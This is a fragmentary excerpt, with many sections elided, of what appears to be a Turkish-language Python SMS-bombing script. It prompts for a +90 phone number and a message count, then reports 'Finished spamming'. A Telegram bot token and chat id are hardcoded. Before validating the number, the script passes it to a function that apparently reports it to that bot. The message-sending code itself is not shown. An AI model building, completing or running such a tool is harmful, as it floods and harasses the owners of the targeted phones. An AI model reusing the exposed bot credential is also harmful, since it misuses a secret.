...
id = "6923048301"
bot = telebot.TeleBot('6782914203:AAFW3s41pL85KwJ6sqBA9exMoLzBr27FCKw')

os.system("clear")
nice = Fore.YELLOW + Style.BRIGHT + "[DOĞRU] " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT
fail = Fore.YELLOW + Style.BRIGHT + "[YANLIŞ] " + Style.RESET_ALL + Fore.RED + Style.BRIGHT
...
def check_number():
    ...
    try:
        ...
        if phone.startswith("0") or phone.startswith("+", 1):
            ...
            print(Fore.RED + Style.BRIGHT + "Numara Yanlış Tekrar Deneyin!" +
                  Style.RESET_ALL)
            exit()
    except Exception:
        print(Fore.RED + Style.BRIGHT + "Numara Yanlış Tekrar Deneyin!" +
...
def start():
    banner = pyfiglet.figlet_format("SMS")
    print(Fore.RED)
...
def menu():
    ...
    print('-------------------------------')
    global phone
    phone = input(Fore.RED + 'Telefon Numarası (+90 ile giriniz): ')
    test(id, phone)
    if phone == '2':
        os.system("clear")
        print(Fore.GREEN)
        print(banner)
        phone = input('Telefon Numarası (+90 ile giriniz): ')
    check_number()
    global count
    count = input('Kaç tane gönderilsin?: ' + Style.RESET_ALL)
    print('------------------------------------')
    count = int(count)
    os.system("clear")
    generate_info()
    ...
    print(
        ...
        f"Created by UMUT translated and modified by Quessts\nFinished spamming\nPhone Number: {phone}\nNumber of rounds ran: {iteration}"
        + Style.RESET_ALL)
